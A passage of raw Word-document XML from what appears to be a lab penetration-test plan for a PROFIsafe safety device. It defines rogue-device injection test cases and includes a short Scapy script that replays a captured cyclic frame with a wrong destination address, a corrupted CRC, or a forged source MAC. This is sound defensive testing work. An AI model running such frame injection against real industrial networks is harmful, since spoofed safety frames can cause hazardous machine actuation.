              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>protocol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manipulation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="40946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F39D5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A567B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Prove the F-Device </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>rejects</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> frames from a connecting rogue device with (a) an incorrect </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and (b) an invalid CRC (→ safe outcome), and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>characterise</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the boundary</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> by injecting (c) a frame with correct </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + a valid recomputed CRC and a forged source.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="260D5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E8D00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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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3EDFA" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">With </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>cyclic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traffic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running</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>rogue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device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injects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crafted</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> FSCP </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>frames</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">: (a) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>wrong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F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">; (b) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>correct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F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>corrupted</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> CRC/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>payload</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">; (c) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>correct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F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>recomputed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> valid CRC, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>forged</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> source MAC. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Observe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qualifier</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>outputs</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>diagnostics</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="3F778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5907A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4798A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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>a,b</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the DUT ignores/rejects the frame and continues on legitimate traffic or passivates to safe state (outputs Low, qualifier bad) — </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no unsafe actuation</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">(c) = boundary </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>characterisation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> expected result = frame </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>accepted</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (proving G-2 — authenticity depends on the black channel/firewall), recorded as </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>residual risk covered by SRIO-9402</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, not scored as device FAIL. </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (a) or (b) causes an </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>uncommanded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/hazardous output.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6707C25C" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D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06297D" w:rsidRPr="0006297D" w14:paraId="52F613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B8256E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80B6EA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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="7A60B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94C03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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297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5DA9F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="72644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9249F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EE1AB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>Pi eth0 = 192.168.0.100 side-inject; DUT 192.168.0.2; SPS 192.168.0.1; laptop mirror</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="32EF7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B29DE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1D46F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t>Scapy</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (Pi), Wireshark (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>laptop</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2773CFAF" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:t>#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F335B5" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:t># TC-RQ001-02 Rogue-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>device</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> (Layer 2, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>EtherType</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> 0x8892)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D601F05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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> import Ether, Raw, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sendp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rdpcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5B92DA7B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>IFACE = "eth0"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD48E75" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tmpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rdpcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ref.pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>")[0] # one legitimate cyclic frame from the mirror</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1469D5F4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>payload = bytes(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tmpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">[Raw].load) # PN-RT + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (PD | status/control | 4-byte CRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B41B500" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62C9A627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def inject(name, data, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tmpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[Ether].</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>="02:11:22:33:44:55"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF8083F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sendp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Ether(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, type=0x8892)/Raw(load=data),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0261502D" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=IFACE, count=200, inter=0.002)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4D886A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>print(f"[+] sent: {name}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7741F2" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6929BFEC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a = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bytearray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(payload); a[-6] ^= 0xFF # (a) WRONG </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Dest_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="01B4A6DE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>inject("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>a_wrong_dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>", bytes(a))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7235DE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b = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bytearray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(payload); b[2] ^= 0x01 # (b) corrupt PD, leave CRC -&gt; mismatch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A89475D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>inject("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>b_bad_crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>", bytes(b))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8390B8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>inject("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>c_valid_from_rogue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>", payload) # (c) BOUNDARY: valid frame, forged source -&gt; G-2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5553BA82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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | (a) ☐PASS ☐FAIL (b) ☐PASS ☐FAIL (c) ☐ boundary confirmed → residual risk logged | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC02_inject.pcapng, Pi log, SRIO FS/P-LED photo, PLC diagnostic-buffer export |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0826FB00" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Safety:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
